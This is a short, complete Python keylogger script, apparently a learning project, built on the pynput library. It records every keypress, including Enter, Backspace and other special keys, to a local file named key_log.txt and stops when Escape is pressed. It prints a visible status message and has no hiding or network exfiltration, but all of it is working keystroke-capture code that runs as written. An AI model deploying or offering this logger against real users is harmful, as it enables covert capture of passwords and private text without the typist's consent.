import os
from pynput.keyboard import Key, Listener

# Path to save the logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        # Capture standard alphanumeric keys
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Capture special keys (Space, Enter, Backspace, etc.)
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.backspace:
                f.write("[BACKSPACE]")
            else:
                f.write(f" [{key.name}] ")

def on_release(key):
    # Stop the keylogger safely by pressing the Escape key
    if key == Key.esc:
        print("\n[!] Exiting keylogger project safely.")
        return False

# Setup and run the listener loop
print("[*] Keylogger active. Press 'Esc' to stop and view 'key_log.txt'...")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
